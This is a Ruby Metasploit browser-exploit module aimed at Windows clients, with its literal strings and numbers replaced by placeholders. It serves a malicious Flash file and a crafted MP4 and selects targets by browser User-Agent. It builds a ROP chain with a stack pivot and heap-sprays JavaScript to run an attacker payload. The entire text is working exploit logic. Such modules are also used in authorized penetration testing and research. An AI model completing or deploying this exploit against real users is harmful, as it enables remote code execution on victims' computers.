require <str> class Metasploit3 < Msf :: Exploit :: Remote Rank = NormalRanking include Msf :: Exploit :: Remote :: HttpServer :: HTML include Msf :: Exploit :: RopDb include Msf :: Exploit :: Remote :: BrowserAutopwn autopwn_info ( { <str> = > OperatingSystems :: Match :: WINDOWS , <str> = > <str> , <str> = > <str> , <str> = > NormalRanking , <str> = > true } ) def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> , <str> , <str> ] , <str> = > [ [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] , [ <str> , <str> ] ] , <str> = > { <str> = > <int> , <str> = > <str> , <str> = > true } , <str> = > { <str> = > <str> } , <str> = > <str> , <str> = > [ [ <str> , { } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> , <str> = > <hex> } ] , [ <str> , { <str> = > nil , <str> = > <str> , <str> = > <hex> } ] , [ <str> , { <str> = > <str> , <str> = > <str> , <str> = > <hex> , <str> = > <hex> } ] ] , <str> = > false , <str> = > <str> , <str> = > <int> ) ) end def junk ( n = <int> ) return rand_text_alpha ( n ) . unpack ( <str> ) . first end def get_payload ( t , cli ) if t [ <str> ] . nil? code = <str> else code = <str> end code << payload . encoded return code if t [ <str> ] . nil? rop_name = ( t [ <str> ] and t [ <str> ] == <str> ) ? <str> : <str> rop_target = ( rop_name == <str> ) ? <str> : <str> pivot = [ t [ <str> ] ] . pack ( <str> ) pivot << [ junk ] . pack ( <str> ) pivot << [ t . ret ] . pack ( <str> ) code = generate_rop_payload ( rop_name , code , { <str> = > rop_target } ) return code end def get_target ( agent ) return target if target . name != <str> if agent =~ <str> and agent =~ <str> return targets [ <int> ] elsif agent =~ <str> and agent =~ <str> return targets [ <int> ] elsif agent =~ <str> and agent =~ <str> return targets [ <int> ] elsif agent =~ <str> and agent =~ <str> return targets [ <int> ] elsif agent =~ <str> and agent =~ <str> return targets [ <int> ] else return nil end end def primer hardcoded_uripath ( <str> ) end def exploit @swf = create_swf super end def on_request_uri ( cli , request ) agent = request . headers [ <str> ] my_target = get_target ( agent ) if my_target . nil? print_error ( <str> agent <str> ) send_not_found ( cli ) return end print_status ( <str> request . uri <str> ) if request . uri =~ <str> print_status ( <str> ) mp4 = create_mp4 ( my_target ) send_response ( cli , mp4 , { <str> = > <str> } ) return end if request . uri =~ <str> print_status ( <str> ) send_response ( cli , @swf , { <str> = > <str> } ) return end p = get_payload ( my_target , cli ) js_code = Rex :: Text . to_unescape ( p , Rex :: Arch . endian ( my_target . arch ) ) js_nops = Rex :: Text . to_unescape ( <str> * <int> , Rex :: Arch . endian ( my_target . arch ) ) js_pivot = <<- <str> JS <str> <str> JS js_pivot = heaplib ( js_pivot , { <str> = > true } ) swf_uri = ( <str> == get_resource [ - <int> , <int> ] ) ? get_resource [ <int> , get_resource . length - <int> ] : get_resource swf_uri << <str> rand_text_alpha ( rand ( <int> ) + <int> ) <str> html = <str> js_pivot <str> swf_uri <str> swf_uri <str> html = html . gsub ( <str> , <str> ) print_status ( <str> ) send_response ( cli , html , { <str> = > <str> } ) end def create_swf path = :: File . join ( Msf :: Config . data_directory , <str> , <str> ) fd = :: File . open ( path , <str> ) swf = fd . read ( fd . stat . size ) fd . close return swf end def create_mp4 ( target ) mp4 = <str> mp4 << <str> mp4 << <str> mp4 << <str> mp4 << <str> mp4 << <str> mp4 << <str> mp4 << <str> mp4 << <str> mp4 << <str> * <int> return mp4 end end 
